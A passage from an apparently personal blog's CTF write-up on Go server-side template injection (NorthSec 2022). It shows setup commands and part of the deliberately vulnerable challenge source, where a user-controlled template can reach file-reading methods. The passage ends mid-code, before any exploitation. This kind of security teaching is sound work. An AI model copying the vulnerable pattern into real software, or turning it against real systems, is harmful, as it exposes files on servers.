<!doctype html><html lang=en data-mode=dark><head prefix="og: http://ogp.me/ns#"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.100.2"><meta name=theme content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world"><title>[NSEC 2022] Marketing Email Template | Jose Apari-Pantigozo</title><meta name=author content="Jose Apari-Pantigozo"><meta name=robots content="index follow"><link rel=canonical href=https://aparipantigozo.com/nsec2022-marketing-email-template/><meta property="og:site_name" content="Jose Apari-Pantigozo"><meta property="og:title" content="[NSEC 2022] Marketing Email Template"><meta property="og:url" content="https://aparipantigozo.com/nsec2022-marketing-email-template/"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-06-11"><meta property="article:modified_time" content="2022-06-11"><meta property="og:updated_time" content="2022-06-11"><meta name=twitter:creator content="@aparipantigozo"><meta name=twitter:site content="@aparipantigozo"><meta name=theme-color content="#222"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="default"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebSite","@id":"https://aparipantigozo.com"},"headline":"[NSEC 2022] Marketing Email Template","description":"","url":"https://aparipantigozo.com/nsec2022-marketing-email-template/","inLanguage":"en","datePublished":"2022-06-11","dateModified":"2022-06-11","wordCount":"5069","publisher":{"@type":"Person","name":"Jose Apari-Pantigozo"},"author":{"@type":"Person","name":"Jose Apari-Pantigozo","description":"Offensive Cybersecurity Research Enthusiast","sameAs":["https://github.com/ja-p","https://www.linkedin.com/in/japari-pantigozo","https://twitter.com/aparipantigozo","https://www.root-me.org/fishinspace","https://ringzer0ctf.com/profile/31298","https://pentesterlab.com/profile/Fishinspace","https://app.hackthebox.com/profile/194337"]}}</script><link rel=stylesheet href=https://aparipantigozo.com/css/main.min.50c66aed711d96bbe329630e27abd3721c54f400513a7f2539f2370563a629ea.css integrity="sha256-UMZq7XEdlrvjKWMOJ6vTchxU9ABROn8lOfI3BWOmKeo=" crossorigin=anonymous><noscript><meta name=theme-color content="#c4ddff" media="(prefers-color-scheme: dark)"><meta name=theme-color content="#5f4b8b" media="(prefers-color-scheme: light)"><link rel=stylesheet href=https://aparipantigozo.com/css/noscript.min.03a52cf465d7cd8d014413743bc3e9310782be3f3b428b9aaa6b98e326d05a84.css integrity="sha256-A6Us9GXXzY0BRBN0O8PpMQeCvj87QouaqmuY4ybQWoQ=" crossorigin=anonymous></noscript><link rel=preload href=/fonts/open-sans-v17-latin-700.woff2 as=font crossorigin=anonymous><link rel=preload href=/fonts/open-sans-v17-latin-italic.woff2 as=font crossorigin=anonymous><link rel=preload href=/fonts/open-sans-v17-latin-regular.woff2 as=font crossorigin=anonymous><link rel=preload href=/fonts/oswald-v29-latin-700.woff2 as=font crossorigin=anonymous><link rel=me href=https://github.com/ja-p><link rel=me href=https://www.linkedin.com/in/japari-pantigozo><link rel=me href=https://twitter.com/aparipantigozo><link rel=me href=https://www.root-me.org/fishinspace><link rel=me href=https://ringzer0ctf.com/profile/31298><link rel=me href=https://pentesterlab.com/profile/Fishinspace><link rel=me href=https://app.hackthebox.com/profile/194337><script src=https://aparipantigozo.com/js/main.0231ee3e70c2e04fb5af8acaace046df7c3d133cf4892834230a80e214ca34d1.js integrity="sha256-AjHuPnDC4E+1r4rKrOBG33w9Ezz0iSg0IwqA4hTKNNE=" crossorigin=anonymous></script></head><body><header><a href=/>Jose Apari-Pantigozo</a><nav aria-label="Main menu."><ul><li><a class=btn href=/posts/>Posts</a></li><li><a class=btn href=/curriculum-vitae>CV</a></li><li><a class=btn href=/contact/>Contact</a></li></ul></nav></header><div class=filler><main><article><header><h1>[NSEC 2022] Marketing Email Template</h1><div class=terms><ul><li><a class=btn href=/tags/ctf/>CTF</a></li><li><a class=btn href=/tags/nsec/>NSEC</a></li></ul></div><p>Published on <time datetime=2022-06-11>2022-06-11</time></p></header><details class=toc open><summary class=outline-dashed>Contents</summary><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#note>Note</a></li><li><a href=#level-1---baby-steps>Level 1 - Baby Steps</a><ul><li><a href=#get->GET /</a></li><li><a href=#post-update>POST /update</a></li><li><a href=#any-preview>ANY /preview</a></li><li><a href=#the-vulnerability>The Vulnerability</a></li></ul></li><li><a href=#level-2---pass-go-and-collect-sh>Level 2 - Pass Go and Collect $(sh)</a><ul><li><a href=#the-vulnerability-1>The Vulnerability</a></li><li><a href=#the-exploitation>The Exploitation</a></li></ul></li><li><a href=#level-3---just-a-regular-bypass>Level 3 - Just a Regular Bypass</a><ul><li><a href=#alternative>Alternative</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></details><h2 id=introduction><a class=anchor href=#introduction title='Anchor for: Introduction.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>Introduction</h2><p>During the weekend of May 21st, I participated with my team <strong>PolyHx</strong> in the NorthSec CTF 2022. This is a write-up about a track of 3 flags around SSTI (Server-Side Template Injection) in Go. The context is that we are auditing an application used to draft marketing emails through a template.</p><p>My team ended up being the first to complete the whole track.</p><h2 id=note><a class=anchor href=#note title='Anchor for: Note.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>Note</h2><p>The <code>main.go</code> files can be built and ran and during the CTF I was debugging locally most of the time. Need to setup a <code>templates/</code> folder containing placeholder <code>templates/index.html</code> and <code>templates/preview.html</code> beforehand.</p><div class=highlight><pre aria-label="Box containing code sample." tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir templates
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Index&#34;</span> &gt; templates/index.html
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Preview&#34;</span> &gt; templates/preview.html
</span></span><span class=line><span class=cl>go build main.go
</span></span><span class=line><span class=cl>./main
</span></span></code></pre></div><p>Also, the URLs of the challenge were only accessible during the event due to the CTF having its own infrastructure.</p><h2 id=level-1---baby-steps><a class=anchor href=#level-1---baby-steps title='Anchor for: Level 1 - Baby Steps.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>Level 1 - Baby Steps</h2><p>Accessing the website (<a href=http://dev.email-template.ctf>http://dev.email-template.ctf</a>), we are welcomed with an application that allows us to specify a template for a marketing email which can contain variables like <code>{{ .title }}</code>. There is a link to download the source code of the application, which uses the Go language.</p><p>In this case, I approached the web application code by first looking into the exposed server routes as there were not that many.</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=hl><span class=lnt> 22
</span></span><span class=hl><span class=lnt> 23
</span></span><span class=hl><span class=lnt> 24
</span></span><span class=lnt> 25
</span><span class=hl><span class=lnt> 26
</span></span><span class=hl><span class=lnt> 27
</span></span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=hl><span class=lnt> 30
</span></span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=hl><span class=lnt> 36
</span></span><span class=hl><span class=lnt> 37
</span></span><span class=hl><span class=lnt> 38
</span></span><span class=hl><span class=lnt> 39
</span></span><span class=hl><span class=lnt> 40
</span></span><span class=hl><span class=lnt> 41
</span></span><span class=hl><span class=lnt> 42
</span></span><span class=hl><span class=lnt> 43
</span></span><span class=lnt> 44
</span><span class=hl><span class=lnt> 45
</span></span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=hl><span class=lnt> 54
</span></span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=hl><span class=lnt> 57
</span></span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=hl><span class=lnt> 62
</span></span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=hl><span class=lnt>104
</span></span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=hl><span class=lnt>110
</span></span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=hl><span class=lnt>118
</span></span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=hl><span class=lnt>176
</span></span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=hl><span class=lnt>190
</span></span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=hl><span class=lnt>197
</span></span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;path&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;errors&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;strings&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;io/ioutil&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;html/template&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>Update</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>Template</span> <span class=kt>string</span> <span class=s>`json:&#34;template&#34; binding:&#34;required&#34;`</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl><span class=kd>type</span> <span class=nx>MyApp</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>    <span class=nx>templateName</span> <span class=kt>string</span>
</span></span><span class="line hl"><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl><span class=kd>func</span> <span class=p>(</span><span class=nx>m</span> <span class=o>*</span><span class=nx>MyApp</span><span class=p>)</span> <span class=nf>ReadFile</span><span class=p>()</span> <span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>    <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Open</span><span class=p>(</span><span class=nx>m</span><span class=p>.</span><span class=nx>templateName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>files</span><span class=p>,</span> <span class=nx>e</span> <span class=o>:=</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadDir</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nf>Dir</span><span class=p>(</span><span class=nx>m</span><span class=p>.</span><span class=nx>templateName</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>e</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>{},</span> <span class=nx>e</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>        <span class=kd>var</span> <span class=nx>filenames</span> <span class=p>[]</span><span class=kt>string</span>
</span></span><span class="line hl"><span class=cl>        <span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>file</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>files</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>            <span class=kd>var</span> <span class=nx>filename</span> <span class=kt>string</span> <span class=p>=</span> <span class=nx>file</span><span class=p>.</span><span class=nf>Name</span><span class=p>()</span>
</span></span><span class="line hl"><span class=cl>            <span class=k>if</span> <span class=nx>file</span><span class=p>.</span><span class=nf>IsDir</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>                <span class=nx>filename</span> <span class=o>+=</span> <span class=s>&#34; (directory)&#34;</span>
</span></span><span class="line hl"><span class=cl>            <span class=p>}</span>
</span></span><span class="line hl"><span class=cl>            <span class=nx>filenames</span> <span class=p>=</span> <span class=nb>append</span><span class=p>(</span><span class=nx>filenames</span><span class=p>,</span> <span class=nx>filename</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>        <span class=k>return</span> <span class=p>[]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprint</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=o>+</span> <span class=s>&#34;\nPossible files:\n&#34;</span> <span class=o>+</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Join</span><span class=p>(</span><span class=nx>filenames</span><span class=p>[:],</span> <span class=s>&#34;\n&#34;</span><span class=p>)),</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>defer</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>();</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}()</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>    <span class=k>return</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadAll</span><span class=p>(</span><span class=nx>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl><span class=kd>func</span> <span class=p>(</span><span class=nx>m</span> <span class=o>*</span><span class=nx>MyApp</span><span class=p>)</span> <span class=nf>SetTemplateName</span><span class=p>(</span><span class=nx>name</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>name</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>errors</span><span class=p>.</span><span class=nf>New</span><span class=p>(</span><span class=s>&#34;TemplateName cannot be nil or empty.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>    <span class=nx>m</span><span class=p>.</span><span class=nx>templateName</span> <span class=p>=</span> <span class=nx>name</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span> <span class=o>:=</span> <span class=nx>gin</span><span class=p>.</span><span class=nf>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>LoadHTMLGlob</span><span class=p>(</span><span class=s>&#34;templates/*&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Static</span><span class=p>(</span><span class=s>&#34;/assets&#34;</span><span class=p>,</span> <span class=s>&#34;./assets&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>GET</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>m</span> <span class=o>:=</span> <span class=nx>MyApp</span><span class=p>{</span><span class=s>&#34;templates/index.html&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nx>content</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>m</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>m</span><span class=p>.</span><span class=nf>SetTemplateName</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>preview</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>m</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>tmpl</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>template</span><span class=p>.</span><span class=nf>New</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>).</span><span class=nf>Parse</span><span class=p>(</span><span class=nb>string</span><span class=p>(</span><span class=nx>content</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>Status</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>err</span> <span class=p>=</span> <span class=nx>tmpl</span><span class=p>.</span><span class=nf>Execute</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;title&#34;</span><span class=p>:</span><span class=s>&#34;Test!&#34;</span><span class=p>,</span><span class=s>&#34;template&#34;</span><span class=p>:</span><span class=nb>string</span><span class=p>(</span><span class=nx>preview</span><span class=p>),</span><span class=s>&#34;m&#34;</span><span class=p>:</span><span class=o>&amp;</span><span class=nx>m</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>POST</span><span class=p>(</span><span class=s>&#34;/update&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>update</span> <span class=nx>Update</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>err</span> <span class=kt>error</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>        <span class=nx>err</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>BindJSON</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>update</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>        <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>OpenFile</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>,</span> <span class=nx>os</span><span class=p>.</span><span class=nx>O_WRONLY</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_CREATE</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_TRUNC</span><span class=p>,</span> <span class=mo>0664</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>defer</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>        <span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>WriteString</span><span class=p>(</span><span class=nx>update</span><span class=p>.</span><span class=nx>Template</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=s>&#34;ok&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Any</span><span class=p>(</span><span class=s>&#34;/preview&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>m</span> <span class=o>:=</span> <span class=nx>MyApp</span><span class=p>{</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>title</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>title</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>title</span> <span class=p>=</span> <span class=s>&#34;Test Email&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>eventname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>eventname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
